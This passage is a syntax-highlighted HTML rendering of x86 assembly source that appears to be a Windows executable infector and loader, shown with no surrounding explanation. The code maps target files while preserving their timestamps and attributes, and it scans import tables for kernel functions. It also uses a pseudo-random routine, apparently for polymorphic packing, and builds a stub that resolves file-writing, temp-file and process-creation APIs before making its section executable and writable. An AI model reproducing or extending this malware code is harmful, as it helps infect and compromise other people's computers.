   </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc5">_create_flag</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">CREATE_ALWAYS</span><span class="sc0">
   </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">_map</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">hWnd_CreateFile</span><span class="sc0">
   </span><span class="sc5">callx</span><span class="sc0"> </span><span class="sc5">GetFileSize</span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">_file_size</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

   </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">_close_3</span><span class="sc0">

   </span><span class="sc5">_map</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">_file_size</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">_map_access_type</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">hWnd_CreateFile</span><span class="sc0">
   </span><span class="sc5">callx</span><span class="sc0"> </span><span class="sc5">CreateFileMappingA</span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">hWnd_CreateFileMapping</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

   </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">_close_3</span><span class="sc0">

   </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">_file_size</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">_mview_access_type</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">hWnd_CreateFileMapping</span><span class="sc0">
   </span><span class="sc5">callx</span><span class="sc0"> </span><span class="sc5">MapViewOfFile</span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">hWnd_MapViewOfFile</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

   </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">_close_4</span><span class="sc0">

   </span><span class="sc5">_io_end</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+(</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc2">7</span><span class="sc4">)],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">popad</span><span class="sc0">
   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
   </span><span class="sc6">ret</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">1</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">)</span><span class="sc0">

   </span><span class="sc5">_close_file</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">
   </span><span class="sc6">pushad</span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">hWnd_MapViewOfFile</span><span class="sc0">
   </span><span class="sc5">callx</span><span class="sc0"> </span><span class="sc5">UnmapViewOfFile</span><span class="sc0">

   </span><span class="sc5">_close_4</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">hWnd_CreateFileMapping</span><span class="sc0">
   </span><span class="sc5">callx</span><span class="sc0"> </span><span class="sc5">CloseHandle</span><span class="sc0">

   </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">FILE_BEGIN</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">_file_size</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">hWnd_CreateFile</span><span class="sc0">
   </span><span class="sc5">callx</span><span class="sc0"> </span><span class="sc5">SetFilePointer</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">hWnd_CreateFile</span><span class="sc0">
   </span><span class="sc5">callx</span><span class="sc0"> </span><span class="sc5">SetEndOfFile</span><span class="sc0">

   </span><span class="sc5">_close_3</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">_file_time</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">hWnd_CreateFile</span><span class="sc0">
   </span><span class="sc5">callx</span><span class="sc0"> </span><span class="sc5">SetFileTime</span><span class="sc0">

   </span><span class="sc5">_close_2</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">hWnd_CreateFile</span><span class="sc0">
   </span><span class="sc5">callx</span><span class="sc0"> </span><span class="sc5">CloseHandle</span><span class="sc0">

   </span><span class="sc5">_close_1</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">_file_attrib</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
   </span><span class="sc5">callx</span><span class="sc0"> </span><span class="sc5">SetFileAttributesA</span><span class="sc0">

   </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">_io_end</span><span class="sc0">

   </span><span class="sc5">locate_import</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">pushad</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">_image_nt_headers</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ecx.IMAGE_NT_HEADERS.OptionalHeader.DataDirectory\
</span><span class="sc0">   </span><span class="sc5">.</span><span class="sc4">(</span><span class="sc9">SIZE</span><span class="sc0"> </span><span class="sc5">IMAGE_DATA_DIRECTORY</span><span class="sc4">*</span><span class="sc5">IMAGE_DIRECTORY_ENTRY_IMPORT</span><span class="sc4">)\
</span><span class="sc0">   </span><span class="sc5">.VirtualAddress</span><span class="sc4">]</span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">_infect_import_dir_rva</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">_rva_to_va</span><span class="sc0">

   </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">end_locate_import</span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

   </span><span class="sc5">_find_kernel</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.Name1</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">_rva_to_va</span><span class="sc0">

   </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">end_locate_import</span><span class="sc0">

   </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">SIZE</span><span class="sc0"> </span><span class="sc5">IMAGE_IMPORT_DESCRIPTOR</span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc12">'NREK'</span><span class="sc0">
   </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">

   </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
   </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">_find_kernel</span><span class="sc0">

   </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">SIZE</span><span class="sc0"> </span><span class="sc5">IMAGE_IMPORT_DESCRIPTOR</span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
   </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">_kernel_import_va</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.FirstThunk</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">_import_function</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

   </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">end_locate_import</span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.OriginalFirstThunk</span><span class="sc4">]</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">_rva_to_va</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">_rva_to_va</span><span class="sc0">
   </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">_find_function_1</span><span class="sc0">

   </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">_find_function</span><span class="sc0">

   </span><span class="sc5">_find_function_1</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.FirstThunk</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">_import_function</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">_rva_to_va</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">_rva_to_va</span><span class="sc0">
   </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">end_locate_import</span><span class="sc0">

   </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">end_locate_import</span><span class="sc0">

   </span><span class="sc5">_find_function</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
   </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
   </span><span class="sc5">x_push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">GetProcAddress</span><span class="sc4">~</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">_look_4_function</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">_cmp_1</span><span class="sc0">
   </span><span class="sc5">x_pop</span><span class="sc0">
   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">_import_GetProcAddress</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">end_locate_import</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
   </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
   </span><span class="sc5">x_push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">GetModuleHandleA</span><span class="sc4">~</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">_look_4_function</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">_cmp_1</span><span class="sc0">
   </span><span class="sc5">x_pop</span><span class="sc0">
   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">_import_GetKernel</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">end_locate_import</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
   </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
   </span><span class="sc5">x_push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">LoadLibraryA</span><span class="sc4">~</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">_look_4_function</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">_cmp_1</span><span class="sc0">
   </span><span class="sc5">x_pop</span><span class="sc0">
   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">_import_GetKernel</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

   </span><span class="sc5">end_locate_import</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+(</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc2">7</span><span class="sc4">)],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">popad</span><span class="sc0">
   </span><span class="sc6">ret</span><span class="sc0">

   </span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">PACKER.INC</span><span class="sc0">

   </span><span class="sc5">rnd_ini</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc5">callx</span><span class="sc0"> </span><span class="sc5">GetTickCount</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

   </span><span class="sc5">rnd_ini_loop_1</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rnd_eax</span><span class="sc0">
   </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">rnd_ini_loop_1</span><span class="sc0">
   </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
   </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">rnd_ini</span><span class="sc0">
   </span><span class="sc6">ret</span><span class="sc0">

   </span><span class="sc5">rnd_eax</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2df5a7ech</span><span class="sc0">
   </span><span class="sc5">seed</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">41C64E6Dh</span><span class="sc0">
   </span><span class="sc6">mul</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
   </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">00003039h</span><span class="sc0">
   </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">7FFFFFFFh</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">seed</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
   </span><span class="sc6">ret</span><span class="sc0">

   </span><span class="sc9">align</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">

   </span><span class="sc5">l_start</span><span class="sc0">  </span><span class="sc9">label</span><span class="sc0">

   </span><span class="sc1">;  only if loader mode is = 0</span><span class="sc0">

   </span><span class="sc6">pushf</span><span class="sc0">
   </span><span class="sc6">pushad</span><span class="sc0">

   </span><span class="sc5">l_start_1</span><span class="sc0">   </span><span class="sc9">label</span><span class="sc0">

   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">delta</span><span class="sc0">

   </span><span class="sc5">x_push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">KERNEL32.DLL</span><span class="sc4">~</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">l_start</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc5">_import_GetKernel</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
   </span><span class="sc5">x_pop</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

   </span><span class="sc5">x_push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">CreateFileA</span><span class="sc4">~</span><span class="sc5">WriteFile</span><span class="sc4">~</span><span class="sc5">CloseHandle</span><span class="sc4">~</span><span class="sc5">VirtualProtect</span><span class="sc4">~</span><span class="sc5">OpenMutexA</span><span class="sc4">~</span><span class="sc5">GetTempPathA</span><span class="sc4">~</span><span class="sc5">GetTempFileNameA</span><span class="sc4">~</span><span class="sc5">CreateProcessA</span><span class="sc4">~</span><span class="sc5">GetStartupInfoA</span><span class="sc4">~</span><span class="sc5">GlobalAlloc</span><span class="sc4">~</span><span class="sc5">GlobalFree</span><span class="sc4">~</span><span class="sc0">

   </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">_api_addr_end</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">_api_addr_ini</span><span class="sc4">)</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">_api_addr_end</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">_api_addr_ini</span><span class="sc4">)/</span><span class="sc2">4</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">

   </span><span class="sc5">_api_index_1</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">l_start</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc5">_import_GetProcAddress</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">

   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
   </span><span class="sc6">stosd</span><span class="sc0">

   </span><span class="sc5">_api_index_2</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">lodsb</span><span class="sc0">
   </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
   </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">_api_index_2</span><span class="sc0">
   </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">_api_index_1</span><span class="sc0">

   </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">-(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">_api_addr_end</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">_api_addr_ini</span><span class="sc4">)]</span><span class="sc0">
   </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">_api_addr_ini</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">delta</span><span class="sc4">)]</span><span class="sc0">

   </span><span class="sc1">;  we've all api's to use</span><span class="sc0">

   </span><span class="sc1">;  unlocking loader's section to use it</span><span class="sc0">

   </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">pfdwOldProtect</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">delta</span><span class="sc4">)]</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">PAGE_EXECUTE_READWRITE</span><span class="sc0">
